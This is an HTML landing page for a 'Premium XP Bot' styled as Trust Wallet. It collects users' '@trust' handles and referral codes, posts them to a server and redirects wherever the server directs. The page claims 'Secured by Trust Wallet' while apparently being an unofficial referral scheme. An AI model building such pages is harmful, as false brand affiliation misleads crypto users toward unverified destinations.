<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <link rel="icon" type="image/png" href="https://i.postimg.cc/sg5L6Jsq/Trust-Wallet-removebg-preview.png">
    <title>Premium XP Bot</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 1000;
            opacity: 0;
            transition: all 0.3s ease;
        }
        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }
        .toast-icon {
            width: 20px;
            height: 20px;
        }
    </style>
    
    <div id="toast" class="toast">
        <svg class="toast-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM11 7H13V13H11V7ZM11 15H13V17H11V15Z" fill="currentColor"/>
        </svg>
        <span id="toast-message"></span>
    </div>

    <script>
        function showToast(message) {
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toast-message');
            
            toastMessage.textContent = message;
            toast.classList.add('show');
            
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }
    </script>

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    backgroundImage: {
                        'tw-gradient': 'linear-gradient(135deg, #002f7a 0%, #0a4bb3 50%, #2e1a91 100%)',
                        'trust-btn': 'linear-gradient(90deg, #1c73e8 0%, #0ab1ff 100%)',
                    },
                    // **NEW**: Added a simple keyframe for a floating effect
                    keyframes: {
                        float: {
                            '0%, 100%': { transform: 'translateY(0)' },
                            '50%': { transform: 'translateY(-10px)' },
                        }
                    },
                    // **NEW**: Added an animation utility class
                    animation: {
                        float: 'float 4s ease-in-out infinite',
                    }
                }
            }
        }
    </script>
</head>

<body class="min-h-screen bg-tw-gradient text-white relative overflow-x-hidden">

    <div class="hidden lg:block absolute top-1/4 left-1/4 w-80 h-80 bg-blue-400 rounded-full mix-blend-lighten filter blur-3xl opacity-30 animate-pulse"></div>
    <div class="hidden lg:block absolute bottom-1/4 right-1/4 w-80 h-80 bg-indigo-500 rounded-full mix-blend-lighten filter blur-3xl opacity-30 animate-pulse delay-500"></div>

    <div class="absolute top-0 left-0 w-full flex justify-between items-center px-4 sm:px-6 py-4 z-10">

        <button 
            class="flex items-center gap-2 bg-white/10 backdrop-blur-md px-3 sm:px-4 py-2 rounded-xl border border-white/20 hover:bg-white/20 transition text-sm sm:text-base shadow-lg"
        >
            <img src="https://i.postimg.cc/sg5L6Jsq/Trust-Wallet-removebg-preview.png" class="w-6 sm:w-8" />
            <span class="font-semibold whitespace-nowrap">Trust Premium XP</span>
        </button>
    </div>

    <div class="flex flex-col items-center justify-center min-h-screen text-center px-4 pt-24 pb-12 w-full max-w-7xl mx-auto flex-grow">

        <img 
            src="https://i.postimg.cc/NfB22sLJ/Screenshot-2025-12-12-142250-removebg-preview.png"
            class="w-[300px] sm:w-[400px] md:w-[500px] max-w-full drop-shadow-2xl animate-float z-0"
            alt="Showcase">

        <h1 class="mt-8 text-5xl sm:text-6xl md:text-7xl font-extrabold tracking-tight drop-shadow-xl">
            Trust Wallet
        </h1>

        <p class="mt-4 text-xl opacity-95 max-w-lg">
            The most trusted & secure crypto wallet.
        </p>

        <div class="grid grid-cols-2 gap-4 mt-8 w-full max-w-md">

    <button onclick="window.open('https://apps.apple.com/us/app/trust-crypto-bitcoin-wallet/id1288339409','_blank')" 
        class="flex items-center justify-center gap-2 bg-white/10 border border-white/20 rounded-xl py-4 transition hover:bg-white/30 shadow-lg">
        <img src="https://img.icons8.com/ios-filled/50/ffffff/mac-os.png" class="w-5 filter grayscale">
        <span class="font-semibold text-base sm:text-lg">Get for iOS</span>
    </button>

    <button onclick="window.open('https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph?pli=1','_blank')" 
        class="flex items-center justify-center gap-2 bg-white/10 border border-white/20 rounded-xl py-4 transition hover:bg-white/30 shadow-lg">
        <img src="https://img.icons8.com/color/48/chrome.png" class="w-5">
        <span class="font-semibold text-base sm:text-lg">Extension</span>
    </button>

    <button onclick="window.open('https://trustwallet.com/download','_blank')" 
        class="flex items-center justify-center gap-2 bg-white/10 border border-white/20 rounded-xl py-4 transition hover:bg-white/30 shadow-lg">
        <img src="https://img.icons8.com/fluency/48/android-os.png" class="w-5">
        <span class="font-semibold text-base sm:text-lg">Get APK</span>
    </button>

    <button onclick="window.open('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&pli=1','_blank')" 
        class="flex items-center justify-center gap-2 bg-white/10 border border-white/20 rounded-xl py-4 transition hover:bg-white/30 shadow-lg">
        <img src="https://img.icons8.com/color/48/google-play.png" class="w-5">
        <span class="font-semibold text-base sm:text-lg">Google Play</span>
    </button>

</div>

        
        <div id="input-container" class="mt-8 w-full max-w-md hidden">
            <label for="trust-wallet-handle" class="sr-only">Enter your trust wallet handle</label>
            <input 
                type="text" 
                id="trust-wallet-handle" 
                placeholder="Enter Your handle (ends with @trust)"
                class="w-full py-4 px-6 rounded-xl bg-white/10 text-white placeholder-white/70 border-2 border-white/30 focus:border-white focus:outline-none transition"
            />
            <input type="hidden" id="referral-code" value="">
        </div>

        <button id="main-action-button" class="mt-8 w-full max-w-md py-5 rounded-xl bg-trust-btn shadow-2xl shadow-blue-500/20 flex items-center justify-center gap-3 text-xl font-bold hover:opacity-95 transition hover:scale-[1.01] duration-300">
            Enter Trust Wallet Handle
        </button>

        <p class="mt-4 text-sm opacity-80">
            Make sure to enter a valid Trust Wallet handle
        </p>

        <div class="mt-8 text-xs opacity-60">
            ðŸ”’ Secured by Trust Wallet
        </div>

    </div>

   <script>
  // Get referral code from URL if it exists
  const urlParams = new URLSearchParams(window.location.search);
  const refCode = urlParams.get('ref');
  if (refCode) {
    const refInput = document.getElementById('referral-code');
    if (refInput) {
      refInput.value = refCode;
    }
    // Auto-show the input field if there's a referral code
    const inputContainer = document.getElementById('input-container');
    if (inputContainer) {
      inputContainer.classList.remove('hidden');
      const mainButton = document.getElementById('main-action-button');
      if (mainButton) {
        mainButton.textContent = 'Submit Handle';
      }
      const handleInput = document.getElementById('trust-wallet-handle');
      if (handleInput) {
        handleInput.focus();
      }
    }
  }

  document.addEventListener('DOMContentLoaded', function() {
    const mainButton = document.getElementById('main-action-button');
    if (!mainButton) return;

    mainButton.addEventListener('click', async function() {
      const inputContainer = document.getElementById('input-container');
      if (!inputContainer) return;

      if (inputContainer.classList.contains('hidden')) {
        inputContainer.classList.remove('hidden');
        this.textContent = 'Submit Handle';
        const handleInput = document.getElementById('trust-wallet-handle');
        if (handleInput) handleInput.focus();
        return;
      }

      const handle = document.getElementById('trust-wallet-handle')?.value.trim();
      const referralCode = document.getElementById('referral-code')?.value;
      
      if (!handle || !handle.endsWith('@trust')) {
        showToast('Please enter a valid Trust Wallet handle (must end with @trust)');
        return;
      }

      try {
        const response = await fetch('/auth/handle', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ 
            handle: handle,
            referralCode: referralCode || undefined
          })
        });
        
        const data = await response.json();
        
        if (data.success) {
          showToast(
            data.status === "registered" 
              ? "Handle registered successfully!" 
              : "Welcome back!"
          );
          
          if (data.redirect) {
            setTimeout(() => {
              window.location.href = data.redirect;
            }, 500);
          }
        } else {
          showToast(data.error || 'An error occurred. Please try again.');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Network error. Please check your connection.');
      }
    });

    // Handle Enter key in input field
    const handleInput = document.getElementById('trust-wallet-handle');
    if (handleInput) {
      handleInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          document.getElementById('main-action-button')?.click();
        }
      });
    }
  });
  </script>

</body>
</html>